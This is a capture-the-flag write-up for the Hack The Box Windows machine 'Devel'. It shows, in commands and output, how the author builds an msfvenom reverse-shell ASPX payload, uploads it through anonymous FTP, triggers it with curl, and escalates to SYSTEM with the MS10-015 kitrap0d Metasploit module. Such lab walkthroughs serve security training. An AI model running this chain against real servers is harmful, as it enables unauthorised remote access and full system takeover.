# Devel-HTB
Devel is a Windows machine that is rated as easy. So let's start :)
# Recon
I started by runing nmap scan on the machine.
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.10.5      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-29 19:24 EDT
Nmap scan report for 10.10.10.5
Host is up (0.036s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 09-02-20  06:27AM                 2845 devel2.aspx
| 03-17-17  05:37PM                  689 iisstart.htm
| 09-02-20  04:43AM       <DIR>          KCTXFCYFYF
| 09-02-20  04:36AM                38469 shell.asp
| 09-02-20  05:01AM                38469 shell.aspx
| 09-02-20  05:43AM                15856 shell2.aspx
| 09-02-20  05:44AM                15858 shell3.aspx
| 09-02-20  05:32AM       <DIR>          TLPACDCPFD
| 09-02-20  05:37AM                  150 web.config
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
```
# User Flag
So first let's generate an aspx page that will return a meterpreter shell when we run it.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Devel]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f aspx > meterpreter.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2797 bytes
```
And now upload it to the FTP server:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
09-02-20  06:27AM                 2845 devel2.aspx
03-17-17  05:37PM                  689 iisstart.htm
09-02-20  04:43AM       <DIR>          KCTXFCYFYF
09-02-20  04:36AM                38469 shell.asp
09-02-20  05:01AM                38469 shell.aspx
09-02-20  05:43AM                15856 shell2.aspx
09-02-20  05:44AM                15858 shell3.aspx
09-02-20  05:32AM       <DIR>          TLPACDCPFD
09-02-20  05:37AM                  150 web.config
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> put meterpreter.aspx 
local: meterpreter.aspx remote: meterpreter.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2833 bytes sent in 0.00 secs (62.8316 MB/s)
```
Let's setup now Metasploit:
```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```
Put your data and then run it. Now let's get our shell:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Devel]
└─$ curl http://10.10.10.5/meterpreter.aspx
```
And we got our shell:
```
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.5:49170) at 2020-08-29 19:42:45 -0400

meterpreter > getuid 
Server username: IIS APPPOOL\Web
```
After some searching I found out that the system is vulnerable to ```MS10-015```. So let's exploit it:

Here is the module : ```exploit/windows/local/ms10_015_kitrap0d```
```
msf5 exploit(windows/local/ms10_015_kitrap0d) > options 

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
```
If you exploit it you should gain a shell as ```SYSTEM```
```
msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:4445 
[*] Launching notepad to host the exploit...
[+] Process 3012 launched.
[*] Reflectively injecting the exploit DLL into 3012...
[*] Injecting exploit into 3012 ...
[*] Exploit injected. Injecting payload into 3012...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.28:4445 -> 10.10.10.5:49158) at 2020-08-29 19:51:13 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
Get the User Flag:
```
c:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6...ea70f4cb3e8
```
# Root Flag
Get the Root Flag:
```
c:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
e621a0b50...c4728bc72b4b
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
